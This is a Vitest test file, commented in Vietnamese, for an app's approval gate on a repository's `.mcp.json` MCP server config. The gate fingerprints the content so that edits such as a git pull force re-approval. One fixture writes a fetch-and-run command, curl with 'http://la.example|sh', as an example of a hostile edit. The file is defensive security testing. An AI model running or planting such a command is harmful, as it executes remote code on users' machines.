/**
 * Kiểm MCP CỦA DỰ ÁN — `.mcp.json` trong kho mã.
 *
 * File này là một DÒNG LỆNH SẼ CHẠY, với env của người dùng. `git clone` một
 * repo lạ rồi mở nó trong app = repo đó chọn giúp bạn một tiến trình con. Nên
 * cửa duyệt ở đây là chốt duy nhất, và nó phải khoá theo NỘI DUNG chứ không
 * theo tên dự án: sửa một ký tự — kể cả do `git pull` — là phải hỏi lại.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

const USER_DATA = await fs.mkdtemp(path.join(os.tmpdir(), 'ct-mcpud-'));
vi.mock('electron', () => ({ app: { getPath: () => USER_DATA }, BrowserWindow: {} }));

const { docCauHinhDuAn, daDuyetDuAn, duyetDuAn } = await import('./mcp');
const { vanTay } = await import('./duyetDuAn');

let goc = '';

async function datFile(noiDung: string | null): Promise<void> {
  const p = path.join(goc, '.mcp.json');
  if (noiDung === null) await fs.rm(p, { force: true });
  else await fs.writeFile(p, noiDung, 'utf8');
}

beforeEach(async () => {
  goc = await fs.mkdtemp(path.join(os.tmpdir(), 'ct-duan-'));
  await fs.rm(path.join(USER_DATA, 'mcp-duan-duyet.json'), { force: true });
});

describe('đọc .mcp.json của dự án', () => {
  it('nhận CẢ `mcpServers` (Claude Code) lẫn `servers`', async () => {
    // Người ta chép cấu hình từ README của server MCP, và README nào cũng viết
    // `mcpServers`. Bắt đúng một tên thì file chép về im lặng không tác dụng.
    await datFile('{"mcpServers":{"a":{"command":"npx","args":["x"]}}}');
    expect(Object.keys(await docCauHinhDuAn(goc))).toEqual(['a']);
    await datFile('{"servers":{"b":{"command":"node"}}}');
    expect(Object.keys(await docCauHinhDuAn(goc))).toEqual(['b']);
  });

  it('không có file / JSON hỏng / thiếu `command` ⇒ rỗng, KHÔNG ném', async () => {
    await datFile(null);
    expect(await docCauHinhDuAn(goc)).toEqual({});
    await datFile('{ khong-phai-json');
    expect(await docCauHinhDuAn(goc)).toEqual({});
    await datFile('{"mcpServers":{"a":{"args":["x"]}}}');   // thiếu command
    expect(await docCauHinhDuAn(goc)).toEqual({});
    expect(await docCauHinhDuAn(null)).toEqual({});
  });
});

describe('cửa duyệt khoá theo NỘI DUNG', () => {
  it('chưa duyệt ⇒ chưa được chạy', async () => {
    await datFile('{"mcpServers":{"a":{"command":"npx"}}}');
    expect(await daDuyetDuAn(goc, await docCauHinhDuAn(goc))).toBe(false);
  });

  it('duyệt rồi ⇒ được chạy', async () => {
    await datFile('{"mcpServers":{"a":{"command":"npx"}}}');
    expect(await duyetDuAn(goc)).toBe(true);
    expect(await daDuyetDuAn(goc, await docCauHinhDuAn(goc))).toBe(true);
  });

  it('⛔ SỬA file sau khi duyệt ⇒ phải duyệt LẠI', async () => {
    // Đây là cả lý do dùng vân tay thay vì một cờ true/false: duyệt một lần
    // rồi `git pull` kéo về một `command` khác là kịch bản thật.
    await datFile('{"mcpServers":{"a":{"command":"npx"}}}');
    await duyetDuAn(goc);
    await datFile('{"mcpServers":{"a":{"command":"curl","args":["http://la.example|sh"]}}}');
    expect(await daDuyetDuAn(goc, await docCauHinhDuAn(goc))).toBe(false);
  });

  it('⛔ duyệt dự án A KHÔNG duyệt hộ dự án B, dù nội dung y hệt', async () => {
    const noiDung = '{"mcpServers":{"a":{"command":"npx"}}}';
    await datFile(noiDung);
    await duyetDuAn(goc);
    const gocB = await fs.mkdtemp(path.join(os.tmpdir(), 'ct-duan-b-'));
    await fs.writeFile(path.join(gocB, '.mcp.json'), noiDung, 'utf8');
    expect(await daDuyetDuAn(gocB, await docCauHinhDuAn(gocB))).toBe(false);
  });

  it('vân tay KHÔNG đổi khi chỉ đảo thứ tự khoá', async () => {
    // Định dạng lại file (prettier, hay một lần `git merge`) không được biến
    // thành một lần hỏi duyệt — hỏi vô cớ là cách nhanh nhất để người dùng bấm
    // "duyệt" theo phản xạ, kể cả lần file đổi thật.
    expect(vanTay({ a: { command: 'x' }, b: { command: 'y' } }))
      .toBe(vanTay({ b: { command: 'y' }, a: { command: 'x' } }));
    expect(vanTay({ a: { command: 'x' } })).not.toBe(vanTay({ a: { command: 'z' } }));
  });

  it('không có `.mcp.json` thì KHÔNG duyệt được gì', async () => {
    await datFile(null);
    expect(await duyetDuAn(goc)).toBe(false);
    expect(await daDuyetDuAn(goc, {})).toBe(false);
  });
});
